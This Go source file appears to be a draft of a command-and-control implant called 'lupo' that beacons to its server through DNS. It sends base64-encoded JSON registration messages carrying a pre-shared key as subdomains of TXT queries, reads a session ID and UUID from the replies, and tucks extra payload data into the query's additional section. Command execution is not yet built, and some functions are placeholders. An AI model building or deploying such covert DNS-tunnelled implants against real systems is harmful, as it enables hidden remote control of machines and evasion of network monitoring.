package main

import (
	"encoding/base64"
	"fmt"
	"log"
	"strings"
	"time"
	"encoding/json"
	//"io/ioutil"
	"strconv"
	"runtime"

	"github.com/miekg/dns"
)


// Configuration
type lupoImplant struct {
	updateInterval int
	protocol       string
	dns_domain     string
	rhost          string
	rport          int
	id             int
	uuid           string
	psk            string
	data           string
}

var implant *lupoImplant

func main() {


	implant = &lupoImplant{
		updateInterval: 1,
		protocol:       "DNS",
		dns_domain:     "example.com.",
		rhost:          "127.0.0.1",
		rport:          1337,
		id:             -1,
		uuid:           "",
		psk:            "wolfpack",
		data:           "",
	}

	for {
		ExecLoop(implant)
		time.Sleep(time.Duration(implant.updateInterval) * time.Second)
	}
}

func ExecLoop(implant *lupoImplant){


	var serverResponse map[string]interface{}

	connectionString := implant.rhost + ":" + strconv.Itoa(implant.rport)

	if implant.id == -1{


	   /*
		arch := getArchitecture()

		// Build custom user defined functions
		customFunctions := buildCustomFunctions()

		message := "{\"psk\":\"" + implant.psk + "\",\"register\":true,\"update\":" + strconv.Itoa(implant.updateInterval) + ",\"arch\":\"" + arch + "\",\"functions\":\"" + customFunctions + "\"}"
		subdomain := encodeBase64(message)*/

		//arch := getArchitecture()

		// Build custom user defined functions
		//customFunctions := buildCustomFunctions()

		message := "{\"psk\":\"" + implant.psk + "\",\"register\":true,\"update\":" + strconv.Itoa(implant.updateInterval) + "}"
		subdomain := encodeBase64(message)
	
		fqdn := subdomain + "." + implant.dns_domain // e.g., aGVsbG9fc2VydmVy.example.com.
	
		fmt.Println(fqdn)
		// Construct DNS message
		m := new(dns.Msg)
		m.Id = dns.Id()
		m.RecursionDesired = false
		m.Question = []dns.Question{
			{
				Name:   fqdn,
				Qtype:  dns.TypeTXT,
				Qclass: dns.ClassINET,
			},
		}
		// Send DNS query
		c := new(dns.Client)
		c.Timeout = 5 * time.Second

		resp, _, err := c.Exchange(m, connectionString)
		if err != nil {
			log.Fatalf("Failed to send DNS query: %v", err)
		}

		// Print response
		fmt.Println("📤 Server Response:")
		for _, ans := range resp.Answer {
			if txt, ok := ans.(*dns.TXT); ok {
				fmt.Println("TXT:", strings.Join(txt.Txt, " "))
				
				jsonData := strings.Join(txt.Txt, " ")

				fmt.Println(strings.Join(txt.Txt, " "))


				//jsonData, err := ioutil.ReadAll([]byte(respJoined))

				if err != nil {
					return
				}
		
				// Parse the JSON response
				err = json.Unmarshal([]byte(jsonData), &serverResponse)
		
				if err != nil {
					return
				}

				fmt.Println(jsonData)
		
				// set the new session info for the implant structure
				implant.id = int(serverResponse["sessionID"].(float64))
				implant.uuid = serverResponse["UUID"].(string)
			}
		}


	}else{

		message := "{\"psk\":\"wolfpack\",\"register\":true}"
		subdomain := encodeBase64(message)

		fqdn := subdomain + "." + implant.dns_domain // e.g., aGVsbG9fc2VydmVy.example.com.

		// Construct DNS message
		m := new(dns.Msg)
		m.Id = dns.Id()
		m.RecursionDesired = false
		m.Question = []dns.Question{
			{
				Name:   fqdn,
				Qtype:  dns.TypeTXT,
				Qclass: dns.ClassINET,
			},
		}

		// Add additional payload in Extra section (as TXT)
		extraPayload := "this is the payload and it is definitely longer that 63 characters what are you gonna do about it punk this is 1337 testing holy crap balls woooo chars"
		txt := &dns.TXT{
			Hdr: dns.RR_Header{
				Name:   fqdn,
				Rrtype: dns.TypeTXT,
				Class:  dns.ClassINET,
				Ttl:    0,
			},
			Txt: []string{extraPayload},
		}
		m.Extra = []dns.RR{txt}

		// Send DNS query
		c := new(dns.Client)
		c.Timeout = 5 * time.Second

		resp, _, err := c.Exchange(m, connectionString)
		if err != nil {
			log.Fatalf("Failed to send DNS query: %v", err)
		}

		// Print response
		fmt.Println("📤 Server Response:")
		for _, ans := range resp.Answer {
			if txt, ok := ans.(*dns.TXT); ok {
				fmt.Println("TXT:", strings.Join(txt.Txt, " "))
			}
		}

	}
}

func encodeBase64(input string) string {
	return base64.RawURLEncoding.EncodeToString([]byte(input))
}


func getArchitecture() string {

	arch := runtime.GOOS + "/" + runtime.GOARCH

	return arch

}

func buildCustomFunctions() string {
	custom_functions := []string{
		"\"rootme\":\"gives instant root every time\"",
		"\"other_func\":\"does funky things\""}

	customFunctionStr := "{"
	for index, custom_fun := range custom_functions {

		if index == len(custom_functions)-1 {
			customFunctionStr += custom_fun
		} else {
			customFunctionStr += custom_fun + ","
		}

	}
	customFunctionStr += "}"

	return customFunctionStr
}
